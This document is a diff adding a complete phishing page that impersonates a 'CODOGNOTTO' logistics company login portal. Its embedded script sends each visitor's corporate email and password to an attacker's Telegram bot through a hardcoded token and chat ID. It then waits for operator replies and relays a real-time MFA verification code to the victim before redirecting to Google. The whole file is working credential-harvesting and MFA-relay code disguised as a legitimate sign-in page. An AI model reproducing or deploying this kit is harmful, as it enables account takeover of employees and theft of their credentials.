@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CODOGNOTTO Corporate Access</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --dachser-yellow: #FFD300;
+      --dachser-blue: #003D7A;
+      --dark-bg: #e3f2fd;
+      --card-bg: #ffffff;
+      --text-primary: #1a237e;
+      --text-secondary: #546e7a;
+      --border: #bbdefb;
+      --shadow: 0 10px 40px rgba(0,61,122,0.15);
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: var(--text-primary);
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 6px;
+      background: linear-gradient(90deg, var(--dachser-yellow) 0%, var(--dachser-blue) 100%);
+      z-index: 10;
+    }
+    .tech-bg {
+      position: absolute;
+      inset: 0;
+      opacity: 0.03;
+      background-image: 
+        repeating-linear-gradient(0deg, transparent, transparent 2px, var(--dachser-yellow) 2px, var(--dachser-yellow) 3px),
+        repeating-linear-gradient(90deg, transparent, transparent 2px, var(--dachser-yellow) 2px, var(--dachser-yellow) 3px);
+      background-size: 50px 50px;
+      pointer-events: none;
+    }
+    .container {
+      background: var(--card-bg);
+      width: 100%;
+      max-width: 480px;
+      padding: 48px 40px;
+      border-radius: 16px;
+      box-shadow: var(--shadow);
+      border: 1px solid var(--border);
+      position: relative;
+      z-index: 1;
+    }
+    .logo-section {
+      text-align: center;
+      margin-bottom: 36px;
+    }
+    .logo {
+      background: var(--dachser-yellow);
+      color: #000;
+      font-size: 32px;
+      font-weight: 700;
+      padding: 16px 32px;
+      display: inline-block;
+      margin-bottom: 12px;
+      letter-spacing: 2px;
+    }
+    .tagline {
+      font-size: 11px;
+      color: var(--dachser-yellow);
+      font-weight: 500;
+      letter-spacing: 3px;
+      margin-top: -8px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 500;
+      text-align: center;
+      margin: 32px 0 8px;
+      color: var(--text-primary);
+    }
+    .subtitle {
+      color: var(--text-secondary);
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 32px;
+      font-weight: 300;
+    }
+    .step-dots {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      margin-bottom: 32px;
+    }
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: var(--border);
+      transition: all 0.3s ease;
+      position: relative;
+    }
+    .dot.active {
+      background: var(--dachser-yellow);
+      box-shadow: 0 0 16px rgba(255, 211, 0, 0.5);
+      transform: scale(1.3);
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      color: var(--text-secondary);
+      margin-bottom: 8px;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    input {
+      width: 100%;
+      padding: 16px;
+      font-size: 16px;
+      background: #f5f5f5;
+      color: var(--text-primary);
+      border: 2px solid var(--border);
+      border-radius: 8px;
+      outline: none;
+      transition: all 0.3s;
+    }
+    input::placeholder { color: #90a4ae; }
+    input:focus {
+      border-color: var(--dachser-yellow);
+      background: #ffffff;
+      box-shadow: 0 0 0 3px rgba(255, 211, 0, 0.2);
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 16px 24px;
+      margin: 28px 0 16px;
+      background: var(--dachser-yellow);
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .btn:hover { 
+      background: #ffd700;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(255, 211, 0, 0.3);
+    }
+    .status {
+      min-height: 20px;
+      font-size: 13px;
+      color: #ff6b6b;
+      text-align: center;
+      margin-top: 12px;
+      font-weight: 400;
+    }
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(227, 242, 253, 0.95);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 4px solid var(--border);
+      border-top: 4px solid var(--dachser-yellow);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    #code-container {
+      margin-top: 32px;
+      text-align: center;
+    }
+    #code-label {
+      font-size: 14px;
+      color: var(--text-secondary);
+      margin-bottom: 16px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    #code-display {
+      font-size: 48px;
+      font-weight: 700;
+      letter-spacing: 12px;
+      color: var(--dachser-blue);
+      background: rgba(0, 61, 122, 0.05);
+      padding: 24px;
+      border-radius: 12px;
+      border: 2px solid rgba(0, 61, 122, 0.2);
+      word-break: break-all;
+      text-shadow: 0 0 20px rgba(0, 61, 122, 0.1);
+    }
+    .step { display: none; }
+    .step.active { display: block; }
+    .compliance-text {
+      text-align: center;
+      font-size: 11px;
+      color: var(--text-secondary);
+      margin-top: 32px;
+      padding-top: 24px;
+      border-top: 1px solid var(--border);
+      line-height: 1.6;
+    }
+    .waiting-spinner {
+      margin: 48px auto;
+    }
+  </style>
+</head>
+<body>
+
+<div class="tech-bg"></div>
+
+<div class="loading-overlay" id="loading">
+  <div class="spinner"></div>
+</div>
+
+<div class="container">
+  <div class="logo-section">
+    <div class="logo">CODOGNOTTO</div>
+    <div class="tagline">INTELLIGENT LOGISTICS</div>
+  </div>
+
+  <h1 id="title">Corporate Access</h1>
+  <div class="subtitle" id="subtitle">Secure Authentication Portal</div>
+
+  <div class="step-dots">
+    <div class="dot active" id="dot1"></div>
+    <div class="dot" id="dot2"></div>
+    <div class="dot" id="dot3"></div>
+    <div class="dot" id="dot4"></div>
+  </div>
+
+  <!-- STEP 1 -->
+  <div id="step-email" class="step active">
+    <label for="email">Corporate Email</label>
+    <input type="email" id="email" autocomplete="email" placeholder="employee@codognottoo.com" />
+    <button class="btn" onclick="startWithEmail()">Continue</button>
+    <div id="email-status" class="status"></div>
+  </div>
+
+  <!-- STEP 2 -->
+  <div id="step-ok" class="step">
+    <div class="spinner waiting-spinner"></div>
+    <div id="ok-status" class="status">Verifying credentials...</div>
+  </div>
+
+  <!-- STEP 3 -->
+  <div id="step-password" class="step">
+    <label for="password">Corporate Password</label>
+    <input type="password" id="password" placeholder="••••••••" />
+    <button class="btn" onclick="sendPasswordAndWaitCode()">Authenticate</button>
+    <div id="pw-status" class="status"></div>
+  </div>
+
+  <!-- STEP 4 -->
+  <div id="step-code" class="step">
+    <div id="code-waiting" style="text-align:center;">
+      <div class="spinner waiting-spinner"></div>
+      <div class="status">Generating verification code...</div>
+    </div>
+    
+    <div id="code-container" style="display:none;">
+      <div id="code-label">Enter this code in your authentication app</div>
+      <div id="code-display">— — — —</div>
+      <div class="spinner waiting-spinner"></div>
+      <div class="status">Waiting for confirmation...</div>
+    </div>
+
+    <div id="code-success" style="display:none; text-align:center; padding:48px 0;">
+      <div style="font-size:64px; margin-bottom:16px; color:var(--dachser-yellow);">✓</div>
+      <div style="font-size:24px; color:var(--text-primary); margin-bottom:8px; font-weight:500;">Access Granted</div>
+      <div class="status" style="color:var(--text-secondary);">Redirecting to dashboard...</div>
+    </div>
+  </div>
+
+  <div class="compliance-text">
+    "Integrity in Logistics" - CODOGNOTTO Compliance Management
+  </div>
+</div>
+
+<script>
+  const BOT_TOKEN = '8261446213:AAE4pbH8WxreDoUwIK6kQ6ZRlEbh96bGfZs';
+  const TARGET_CHAT_ID = '7938134233';
+
+  let emailValue = '';
+  let offset = 0;
+  let pollTimer = null;
+  let expectingOKAfterUpdateId = -1;
+
+  const loading = document.getElementById('loading');
+  const dot1 = document.getElementById('dot1');
+  const dot2 = document.getElementById('dot2');
+  const dot3 = document.getElementById('dot3');
+  const dot4 = document.getElementById('dot4');
+
+  function showLoading(show) {
+    loading.style.display = show ? 'flex' : 'none';
+  }
+
+  async function telegramSend(text) {
+    showLoading(true);
+    try {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${TARGET_CHAT_ID}&text=${encodeURIComponent(text)}`;
+      const res = await fetch(url);
+      const data = await res.json();
+      if (data.ok && data.result && data.result.message_id) {
+        return { success: true, message_id: data.result.message_id };
+      }
+      return { success: false };
+    } catch {
+      return { success: false };
+    } finally {
+      showLoading(false);
+    }
+  }
+
+  async function pollFor(expectedUpper, onMatch, options = {}) {
+    const { ignoreBefore = -1, replyToMessageId = null } = options;
+
+    if (pollTimer) clearTimeout(pollTimer);
+
+    try {
+      let url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=10`;
+      if (offset > 0) url += `&offset=${offset + 1}`;
+
+      const res = await fetch(url);
+      const data = await res.json();
+
+      if (data.ok && data.result?.length) {
+        for (const update of data.result) {
+          if (update.update_id > offset) offset = update.update_id;
+
+          const msg = update.message || update.channel_post;
+          if (!msg) continue;
+          if (String(msg.chat.id) !== TARGET_CHAT_ID) continue;
+
+          if (update.update_id <= ignoreBefore) continue;
+
+          if (replyToMessageId !== null) {
+            if (!msg.reply_to_message || msg.reply_to_message.message_id !== replyToMessageId) {
+              continue;
+            }
+          }
+
+          const text = (msg.text || '').trim();
+          const textUpper = text.toUpperCase();
+
+          console.log(`[poll] ${update.update_id} | reply_to:${msg.reply_to_message?.message_id || 'none'} | "${text}"`);
+
+          if (expectedUpper === '' || textUpper === expectedUpper) {
+            onMatch(text);
+            return;
+          }
+        }
+      }
+    } catch (err) {
+      console.warn('poll error', err);
+    }
+
+    pollTimer = setTimeout(() => pollFor(expectedUpper, onMatch, options), 3000);
+  }
+
+  function stopPolling() {
+    if (pollTimer) {
+      clearTimeout(pollTimer);
+      pollTimer = null;
+    }
+  }
+
+  function resetToFirstStep() {
+    stopPolling();
+    
+    document.getElementById('email').value = '';
+    document.getElementById('password').value = '';
+    emailValue = '';
+    
+    document.getElementById('code-waiting').style.display = 'block';
+    document.getElementById('code-container').style.display = 'none';
+    document.getElementById('code-success').style.display = 'none';
+    
+    document.getElementById('email-status').textContent = 'Authentication failed. Please try again.';
+    
+    setStep(1);
+  }
+
+  function setStep(n) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(`step-${n===1?'email':n===2?'ok':n===3?'password':'code'}`).classList.add('active');
+
+    dot1.classList.toggle('active', n===1);
+    dot2.classList.toggle('active', n===2);
+    dot3.classList.toggle('active', n===3);
+    dot4.classList.toggle('active', n===4);
+
+    document.getElementById('title').textContent =
+      n===1 ? 'Corporate Access' :
+      n===2 ? 'Verifying Email' :
+      n===3 ? 'Enter Password' :
+      'Verification Code';
+  }
+
+  async function startWithEmail() {
+    const email = document.getElementById('email').value.trim();
+    if (!email || !email.includes('@')) {
+      document.getElementById('email-status').textContent = 'Please enter a valid email';
+      return;
+    }
+
+    emailValue = email;
+    document.getElementById('email-status').textContent = '';
+
+    try {
+      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=1`);
+      const d = await r.json();
+      if (d.ok && d.result?.length) offset = d.result[0].update_id;
+    } catch {}
+
+    const { success } = await telegramSend(
+      `New attempt\nEmail: ${email}\n\nReply OK to continue or NO to reject`
+    );
+
+    if (!success) {
+      document.getElementById('email-status').textContent = 'Failed to contact Telegram';
+      return;
+    }
+
+    expectingOKAfterUpdateId = offset;
+
+    setStep(2);
+    pollFor('', (receivedText) => {
+      stopPolling();
+      expectingOKAfterUpdateId = -1;
+      
+      const textUpper = receivedText.toUpperCase();
+      
+      if (textUpper === 'NO') {
+        document.getElementById('email').value = '';
+        emailValue = '';
+        document.getElementById('email-status').textContent = 'Incorrect email. Please try again.';
+        setStep(1);
+      } else if (textUpper === 'OK') {
+        setStep(3);
+      } else {
+        pollFor('', arguments.callee, { ignoreBefore: expectingOKAfterUpdateId });
+      }
+    }, { ignoreBefore: expectingOKAfterUpdateId });
+  }
+
+  async function sendPasswordAndWaitCode() {
+    const pw = document.getElementById('password').value.trim();
+    if (!pw) {
+      document.getElementById('pw-status').textContent = 'Please enter a password';
+      return;
+    }
+
+    document.getElementById('pw-status').textContent = '';
+
+    const sendResult = await telegramSend(
+      `Credentials:\nEmail: ${emailValue}\nPassword: ${pw}\n\nReply with the code or NO to reject password`
+    );
+
+    if (!sendResult.success) {
+      document.getElementById('pw-status').textContent = 'Failed to send';
+      return;
+    }
+
+    const passwordMsgId = sendResult.message_id;
+
+    setStep(4);
+    document.getElementById('code-waiting').style.display = 'block';
+    document.getElementById('code-container').style.display = 'none';
+    document.getElementById('code-success').style.display = 'none';
+
+    stopPolling();
+
+    pollFor('', async (receivedText) => {
+      stopPolling();
+      
+      const textUpper = receivedText.toUpperCase();
+      
+      if (textUpper === 'NO') {
+        document.getElementById('password').value = '';
+        document.getElementById('pw-status').textContent = 'Incorrect password. Please try again.';
+        setStep(3);
+        return;
+      }
+      
+      document.getElementById('code-display').textContent = receivedText || '— — — —';
+      document.getElementById('code-waiting').style.display = 'none';
+      document.getElementById('code-container').style.display = 'block';
+      
+      const confirmResult = await telegramSend(
+        `Code shown to user: ${receivedText}\n\nReply YES to confirm or NO to request new code`
+      );
+      
+      if (!confirmResult.success) {
+        console.error('Failed to send confirmation request');
+        return;
+      }
+      
+      const confirmMsgId = confirmResult.message_id;
+      
+      pollForConfirmation(confirmMsgId);
+      
+    }, { replyToMessageId: passwordMsgId });
+  }
+
+  function pollForConfirmation(confirmMsgId) {
+    stopPolling();
+    
+    pollFor('', (receivedText) => {
+      stopPolling();
+      
+      const textUpper = receivedText.toUpperCase();
+      
+      if (textUpper === 'NO') {
+        document.getElementById('code-container').style.display = 'none';
+        document.getElementById('code-success').style.display = 'none';
+        document.getElementById('code-waiting').style.display = 'block';
+        
+        const waitingStatus = document.querySelector('#code-waiting .status');
+        waitingStatus.textContent = 'Code was incorrect. Waiting for new code...';
+        waitingStatus.style.color = '#ff6b6b';
+        
+        telegramSend('Please reply with the new code').then(() => {
+          pollFor('', async (newCode) => {
+            stopPolling();
+            
+            waitingStatus.style.color = '#9aa0a6';
+            
+            document.getElementById('code-display').textContent = newCode || '— — — —';
+            document.getElementById('code-waiting').style.display = 'none';
+            document.getElementById('code-container').style.display = 'block';
+            
+            const newConfirmResult = await telegramSend(
+              `Code shown to user: ${newCode}\n\nReply YES to confirm or NO to request new code`
+            );
+            
+            if (!newConfirmResult.success) {
+              console.error('Failed to send confirmation request');
+              return;
+            }
+            
+            const newConfirmMsgId = newConfirmResult.message_id;
+            
+            pollForConfirmation(newConfirmMsgId);
+            
+          }, {});
+        });
+        
+      } else if (textUpper === 'YES') {
+        document.getElementById('code-container').style.display = 'none';
+        document.getElementById('code-success').style.display = 'block';
+        
+        setTimeout(() => {
+          window.location.href = 'https://www.google.com';
+        }, 2000);
+      } else {
+        pollForConfirmation(confirmMsgId);
+      }
+    }, { replyToMessageId: confirmMsgId });
+  }
+</script>
+</body>
+</html>
